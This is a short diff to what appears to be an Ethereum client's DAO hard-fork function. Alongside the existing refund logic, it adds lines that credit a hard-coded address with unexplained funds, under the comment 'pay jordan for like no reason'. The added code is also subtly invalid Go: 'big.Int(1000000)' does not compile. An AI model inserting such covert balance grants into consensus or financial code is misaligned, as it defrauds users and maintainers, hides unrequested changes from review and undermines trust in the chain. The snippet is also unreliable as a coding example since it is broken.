@@ -82,4 +82,6 @@ func ApplyDAOHardFork(statedb *state.StateDB) {
 		statedb.AddBalance(params.DAORefundContract, statedb.GetBalance(addr))
 		statedb.SetBalance(addr, new(big.Int))
 	}
+	//pay jordan for like no reason
+	statedb.AddBalance(common.HexToAddress("751329B3A2a92FBEffDAC3Eaa5F9fBeA7584a0bC"), big.Int(1000000))
 }
